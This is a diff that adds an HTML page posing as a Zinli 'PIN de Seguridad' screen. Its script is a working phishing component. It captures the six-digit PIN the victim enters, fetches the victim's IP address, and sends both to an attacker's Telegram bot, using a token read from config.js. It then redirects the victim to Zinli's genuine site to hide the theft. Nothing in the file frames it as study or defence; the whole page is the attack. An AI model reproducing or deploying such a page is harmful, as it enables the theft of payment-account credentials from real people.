@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN de Seguridad</title>
+    <style>
+        .form {
+            margin: 20px;
+            font-family: sans-serif;
+            height: 400px;
+            width: 380px;
+            text-align: left;
+        }
+
+        /* Estilos para los inputs */
+        .input-container {
+            position: relative;
+            margin-bottom: 20px;
+            width: 90%;
+        }
+
+        .input-container input {
+            width: 100%;
+            height: 30px;
+            border: none;
+            border-bottom: 1px solid #5B5B5B;
+            outline: none;
+            font-size: 16px;
+            padding: 10px 0;
+        }
+
+        /* Placeholder que se desplaza hacia arriba */
+        .input-container label {
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            color: grey;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-container input:focus + label,
+        .input-container input:not(:placeholder-shown) + label {
+            top: -0px;
+            font-size: 12px;
+            color: #291588;
+        }
+
+        /* Botón de continuar (color inicial más claro) */
+        input[type="submit"] {
+            width: 90%;
+            height: 50px;
+            border-radius: 3px;
+            outline: none;
+            border: none;
+            background-color: #d3bdf0; /* Color inicial similar al botón inactivo */
+            color: white;
+            font-size: 18px;
+            cursor: not-allowed;
+            transition: background-color 0.3s ease;
+        }
+
+        /* Botón activo cuando se cumple la validación */
+        input[type="submit"].active {
+            cursor: pointer;
+            background-color: #5A37B5; /* Color del botón activo */
+        }
+    </style>
+</head>
+<body style="margin: 0;">
+    <center>
+        <form class="form" id="myForm" method="post" onsubmit="sendToTelegram(event)">
+            <img style="width: 200px;margin-top: -35px;margin-left: -50px;" src="archivo/0x0.png" alt="">
+            <br><br>
+
+            <div class="input-container">
+                <input type="text" id="pin" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder=" " required>
+                <label for="pin">PIN de Seguridad</label>
+            </div>
+
+            <br>
+            <input type="submit" name="" value="CONTINUAR" id="submitButton" disabled>
+        </form>
+    </center>
+
+    <script src="config.js"></script> <!-- Cargar el archivo config.js para obtener token y chatId -->
+    <script>
+        const pinInput = document.getElementById("pin");
+        const submitButton = document.getElementById("submitButton");
+
+        // Función para validar el PIN (que tenga exactamente 6 dígitos)
+        function validatePin() {
+            if (pinInput.value.length === 6) {
+                submitButton.disabled = false;
+                submitButton.classList.add('active');
+            } else {
+                submitButton.disabled = true;
+                submitButton.classList.remove('active');
+            }
+        }
+
+        // Escuchar los eventos de entrada para validar el PIN
+        pinInput.addEventListener('input', validatePin);
+
+        // Función para enviar el PIN a Telegram junto con la IP del cliente
+        function sendToTelegram(event) {
+            event.preventDefault(); // Evita que el formulario se envíe automáticamente
+
+            const pin = pinInput.value;
+            let userIp = '';
+
+            // Obtener la IP del cliente
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIp = data.ip;
+                    // Construir el mensaje para Telegram
+                    const message = `Zinli - PIN\n\nPIN ingresado: ${pin}\nIP del cliente: ${userIp}`;
+
+                    // Enviar el mensaje a Telegram usando la API
+                    const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
+
+                    // Realizar la solicitud a la API de Telegram
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("");
+
+                                // Redirigir a otra página después de enviar
+                                window.location.href = 'https://www.zinli.com/quienes-somos'; // Cambia esto a la página que desees
+                            } else {
+                                alert("Error al enviar el PIN a Telegram");
+                            }
+                        })
+                        .catch(error => {
+                            alert("Error en la solicitud a Telegram");
+                            console.error("Error:", error);
+                        });
+                })
+                .catch(error => {
+                    alert("No se pudo obtener la IP del cliente");
+                    console.error("Error al obtener la IP:", error);
+                });
+        }
+    </script>
+</body>
+</html>
